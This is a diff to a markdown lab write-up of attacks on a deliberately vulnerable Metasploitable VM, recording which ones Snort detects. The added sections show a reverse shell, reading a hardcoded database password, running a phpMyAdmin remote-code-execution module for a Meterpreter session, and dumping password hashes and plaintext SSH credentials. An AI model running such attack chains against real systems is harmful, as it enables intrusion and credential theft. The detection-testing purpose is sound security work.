@@ -198,7 +198,35 @@ exploit
 [*] Command shell session 3 opened (192.168.0.104:4444 -> 192.168.0.104:46438) at 2023-11-17 01:03:35 +0200  
 ```
 
-Now we can see that the attack worked successfuly and we have a shell that we can use.
+Now we can see that the attack worked successfuly and we have a shell that we can use, from here we can see the files and folders:
+
+```bash
+ls
+```
+
+```bash
+chat
+drupal
+payroll_app.py                            
+phpmyadmin
+```
+
+If we read the file `payroll_app.php` we can see that it contains some credentials:
+
+```bash
+cat payroll_app.php
+```
+
+```php
+$conn = new mysqli('127.0.0.1', 'root', 'sploitme', 'payroll');                                                                                                                               
+if ($conn->connect_error) {                                                                                                                                                                   
+    die("Connection failed: " . $conn->connect_error);                                                                                                                                        
+}
+```
+
+Then we have the following credentials which might be useful for another attack:
+
+- `root:sploitme`
 
 Also we can see that the attack was detected by snort as a priority 1 attack:
 
@@ -334,4 +362,75 @@ We can also see that the attack was detected by snort as a priority 1 attack:
 11/19-15:01:03.079051  [**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:44957 -> 172.28.128.3:631
 ```
 
-## 
+## Missed Attack 1: PHPMyAdmin
+
+When we access the page `172.28.128.3` from the browser we can see that there is a phpmyadmin page, we can search for a exploit which we can use.
+
+```bash
+search phpmyadmin
+```
+
+```bash
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank       Check  Description
+   -  ----                                                  ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  No     PhpMyAdmin Config File Code Injection
+   1  auxiliary/scanner/http/phpmyadmin_login                                normal     No     PhpMyAdmin Login Scanner
+   2  post/linux/gather/phpmyadmin_credsteal                                 normal     No     Phpmyadmin credentials stealer
+   3  auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     No     Telpho10 Backup Credentials Dumper
+   4  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
+   5  exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     No     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
+   6  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
+   7  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
+   8  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()
+```
+
+We choose the 8th exploit which has an excellent rank and we set its options. One of the options is the password which based on the information we gathered before is `sploitme`.
+
+```bash
+use 8
+set RHOSTS 172.28.128.3
+set password sploitme
+```
+
+Then we run the exploit:
+
+```bash
+exploit
+```
+
+```bash
+[*] Started reverse TCP handler on 192.168.0.104:4444 
+[*] phpMyAdmin version: 3.5.8
+[*] The target appears to be vulnerable.
+[*] Grabbing CSRF token...
+[+] Retrieved token
+[*] Authenticating...
+[+] Authentication successful
+[*] Sending stage (39927 bytes) to 192.168.0.104
+[*] Meterpreter session 5 opened (192.168.0.104:4444 -> 192.168.0.104:48186) at 2023-11-19 19:34:59 +0200
+
+meterpreter > 
+```
+
+This attack was not detected by snort.
+
+We now have meterpreter session, although we would like to have a shell, but now that we know that the credentials `root:sploitme` work, we can try them by accessing the page `172.28.128.3` from the browser, and we have `payroll_app.php` in which if we try to login with the given credentials we can see that we can successfully login and see four columns but with no information.
+
+We can also enter the folder `phpmyadmin` and try to login with the same credentials and we can see that we can login successfully and looking around we see a database called `drupal` and a table `users` which contains the following information:
+
+- `metasploitable:$S$CJIHJhMPBaUXD1eqgmvZEms1N0Ihj6DmJNbe/bldU7ySCk./QC/R`
+
+In the database `mysql`, table `users`:
+
+- `root:*67A5195F64E08F5700B665061545D5473D77B5D7`
+
+Although these passwords are hashed we will keep them in case we need them later and use a tool such as john the ripper to crack them.
+
+Lastly we will access the database `payroll` and table `users` which contains usernames, first names, last names, plain text passwords and salaries. We can see that if we try these users in the `payroll_app.php` we can login with all of them and see the information.
+
+We tried to login to the machine by ssh with the credentials of the table and all of them worked and we could get a shell, but Leia, Luke, and Han had sudo privileges. (`han_solo:nerf_herder`, `luke_skywalker:like_my_father_beforeme`, `leia_organa:help_me_obiwan`).
+
+This is not detected by Snort.
